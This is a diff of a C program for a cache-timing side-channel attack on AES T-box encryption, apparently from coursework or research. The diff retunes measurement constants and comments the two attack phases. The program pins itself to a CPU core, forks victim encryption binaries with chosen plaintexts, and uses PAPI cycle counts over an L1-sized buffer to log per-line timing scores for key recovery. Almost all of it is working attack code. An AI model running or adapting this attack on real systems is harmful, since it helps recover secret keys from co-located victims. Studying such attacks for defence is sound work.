@@ -11,13 +11,12 @@
 #include <string.h>
 #include <time.h>
 
+#define Nt 128
+#define It 16384
+#define N 256                       // Number of measurements in 2nd phase
+#define I 32                        // Number of INNER loop iterations on the 2nd phase
 #define WAIT_TIME 0
-#define Nt 32
-#define It 2048
-#define N 256
-#define I 128
-
-#define L1_LINES 64
+#define L1_LINES 64                 // numbe of L1-D lines
 #define LOGICAL_CORE 3              //  logical core where this process will run on
 #define SIZE32KB (32*1024)          //  represents 32 KB
 #define W 8                         //  associativity number of L1
@@ -28,44 +27,44 @@ void cpu_setup();
 void papi_config(int * retval, int * eventSet);
 void get_plaintexts_t( char * plaintext,  char * plaintext2, int repetition, int min, int max);
 void get_plaintext(char * plaintext);
-// int L1_line_translator( void * addr );
-// int L1_cache_block_offset_translator( void * addr);
 int handle_error(int code, char *outstring);
 
 char V[SIZE32KB];                   
 
 int main(void) { 
 
+    // Makes thread to run on a certain logic core
     cpu_setup();
 
+    // Papi variables
     long_long values[1];
     int retval, EventSet=PAPI_NULL;
     papi_config(&retval, &EventSet);
     srand(time(NULL));   
 
+    // other variables
     FILE* logfile;
     char file_name[35];
     register int min;
     register int i;
     register int ii;
-    // register int iii;
-    char * args[5]; // should be char * const instead !!!
+    char * args[5];
     int pid  = 0;
     int status;
     char plaintext[16*(3+1)+1];
     char plaintext2[16*(3+1)+1];
     long final_score[L1_LINES] = {0};
 
+    printf("### 1st Attack Phase - L1-D T-Box Mapping Phase\n");
 
-    printf("### T-Box Mapping Info Extraction\n");
-
+    // Nt measurement loop
     for(int j = 0; j < Nt ; j++){
 
         for(int l = 0;  l<L1_LINES; l++){
             final_score[l] = 0;
         }
 
-
+        // Produces plaintext P1 and in the next measurement plaintext P2
         if(j%2 == 0){
             get_plaintexts_t(plaintext,plaintext2,j,0,16);
         }
@@ -73,17 +72,17 @@ int main(void) {
             strcpy(plaintext,plaintext2);
         }
 
-        args[0] = "./vic";
+        // fill arguments with the resp. plaintext for the child thread
+        args[0] = "./atk_enc";
         args[1] = plaintext;
-        args[2] = "key";
-        args[3] =  NULL;
 
 
         if ( (pid = fork())== 0) 
-            execv("./vic", args);
+            execv("./atk_enc", args);
 
         usleep(WAIT_TIME);
 
+        // Measurement Code
         while(!waitpid(pid, &status, WNOHANG)){      
     
             for ( min=0; min<SIZE32KB/W; min+=C_BLOCK_SIZE) {
@@ -108,26 +107,21 @@ int main(void) {
 
                 final_score[min/C_BLOCK_SIZE]+= values[0];
             }
-
-            
         }
 
+        // Write Side-channel information
         snprintf(file_name, sizeof(file_name), "side_channel_info/table#%i.out",j);
         logfile = fopen(file_name,"w");
         for(int i = 0; i < L1_LINES; i++){
             fprintf(logfile,"%ld\n", final_score[i]);
         }
         fclose(logfile);
-
-
     }
 
-    // return 0; // ONly FOR TESSTINGG ==========================================
 
+    printf("### 2nd Attack Phase - Online Phase\n");
 
-    printf("### Side Channel Information Extraction !\n"); // this print is required (check book)
-
-    // Measurement loop
+    // N measurement loop
     for(int j = 0; j < N ; j++){    
 
         // resets the score structures
@@ -135,19 +129,22 @@ int main(void) {
             final_score[l] = 0;
         }
 
+        // Produces plaintext P3
         get_plaintext(plaintext);
-        args[0] = "./vic";
+
+        // Fills child argument with plaintext P3
+        args[0] = "./vic_enc";
         args[1] = plaintext;
         args[2] =  NULL;
 
         // fork & creation of a victim
         if ( (pid = fork())== 0) {
-            execv("./vic", args);
+            execv("./vic_enc", args);
         }
 
         usleep(WAIT_TIME);
 
-
+        // Measurement Code
         while(!waitpid(pid, &status, WNOHANG)){
 
             for ( min=0 ; min < STRIDE; min+=C_BLOCK_SIZE) {
@@ -171,28 +168,21 @@ int main(void) {
                 final_score[min/C_BLOCK_SIZE] += values[0];
             }
         }
-
-        // writes cache miss SCI to file
+        // Write Side-channel information
         snprintf(file_name, sizeof(file_name), "side_channel_info/meas#%i.out",j);
         logfile = fopen(file_name, "w");
         fprintf(logfile,"%s\n", plaintext);
         for ( min=0 ; min<STRIDE ; min+=C_BLOCK_SIZE) 
             fprintf(logfile,"%ld\n", final_score[min/C_BLOCK_SIZE]);
         fclose(logfile);
-
     }
-
-
     return 0;
-
 }
-
 
 void get_plaintexts_t( char * plaintext, char * plaintext2, int repetition, int min, int max){
     
     int rand_value;
     char num[4];
-
     plaintext[0] = '\0';
     plaintext2[0] = '\0';
 
@@ -205,15 +195,11 @@ void get_plaintexts_t( char * plaintext, char * plaintext2, int repetition, int 
             strcat(plaintext, num);
             strcat(plaintext2, num);
         }
-
         else{
-
-        
             // [16-256]
             rand_value = (random()%(256-max))+(max-min);
             snprintf(num, sizeof(num)+1, "%i.", rand_value);
             strcat(plaintext,num);
-
             /// [0-16]
             rand_value = (i%(max-min))+(min);
             snprintf(num, sizeof(num)+1, "%i.", rand_value);
@@ -221,8 +207,6 @@ void get_plaintexts_t( char * plaintext, char * plaintext2, int repetition, int 
         }
     }
 }
-
-
 
 
 void get_plaintext(char * plaintext){
@@ -244,11 +228,9 @@ void get_plaintext(char * plaintext){
 }
 
 
-
-
 void papi_config(int * retval, int * EventSet){
 
-        *retval = PAPI_library_init(PAPI_VER_CURRENT);
+    *retval = PAPI_library_init(PAPI_VER_CURRENT);
     if (*retval != PAPI_VER_CURRENT) { 
         fprintf(stderr, "PAPI library init error!\n");
         exit(1);
@@ -257,10 +239,7 @@ void papi_config(int * retval, int * EventSet){
         handle_error(1, "create_eventset");
     if (PAPI_add_event(*EventSet, PAPI_REF_CYC)!= PAPI_OK) 
         handle_error(1,"add_event");
-
-
 }
-
 
 void cpu_setup(){
 
@@ -271,20 +250,6 @@ void cpu_setup(){
         printf("WARNING: Could not set CPU Affinity...\n");
     }
 }
-
-// int L1_line_translator( void * addr) {
-
-//     uint64_t n = (uintptr_t) (addr);
-//     uint64_t x = (n>>6)%SIZE32KB%64;    
-//     return (int) x;
-// }
-
-// int L1_cache_block_offset_translator( void * addr) {
-
-//     uint64_t n = (uintptr_t) (addr);
-//     uint64_t x = n%SIZE32KB%64;    
-//     return (int) x;
-// }
 
 int handle_error(int code, char *outstring){
     
